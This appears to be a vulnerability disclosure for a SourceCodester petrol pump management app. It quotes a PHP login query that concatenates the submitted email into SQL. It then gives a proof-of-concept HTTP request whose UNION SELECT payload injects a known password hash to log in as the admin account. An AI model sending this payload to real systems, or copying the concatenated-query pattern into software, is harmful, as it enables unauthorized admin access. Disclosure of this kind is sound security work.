# SOURCECODESTER / Petrol pump management software - login_crud.php SQL Injection

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://www.sourcecodester.com/php/17180/petrol-pump-management-software-free-download.html

## Affected Component
> /admin/app/login_crud.php

## Code
```php
 $stmt1 = $conn->prepare("SELECT * FROM `login` where email='".$_POST['email']."' AND password='".$password."'");
//         print_r($stmt1);
//
            $stmt1->execute();

            $record=$stmt1->fetchAll();
//            print_r($record);exit;

            $res=count($record);
            if ($res>0) {
                foreach ($record as $res) {
                    // print_r($res);exit;
                    if ($password==$res['password'])
                    {
                    $_SESSION['id']=$res['id'];
                }
                header("location:../dashboard.php" ); 
            }
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /admin/app/login_crud.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 189

email='+UNION%20SELECT%201%20as%20id%2cNULL%2c'a9eb3f6e9eee693434663613e83287ac8b0b7f5f67f4559e40258074a4b0dce6'%20as%20password%2cNULL%2cNULL%2cNULL%2cNULL%20%23&password=NoChizPlz&submit=
```

## Screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/160950031/98f26604-9bb9-4f76-b9ea-1505690aa13c)
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/160950031/ed586fa1-1470-4c10-8991-62fb808661e9)

